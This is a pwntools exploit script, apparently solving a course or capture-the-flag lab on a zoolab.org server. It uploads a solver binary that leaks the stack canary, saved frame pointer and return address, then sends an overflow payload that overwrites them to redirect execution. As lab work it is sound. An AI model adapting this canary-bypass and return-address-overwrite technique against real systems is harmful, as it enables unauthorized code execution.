#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
    
    r.recvline()
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    canary = p64(int(tmp,16))
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    rbp = p64(int(tmp,16))
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    address = p64(int(tmp,16) + 171)
    guess = "0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    pending = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    ans = guess.encode() + canary + rbp + address + pending.encode()
    r.sendafter(b'Show me your answer?', ans)
    
else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
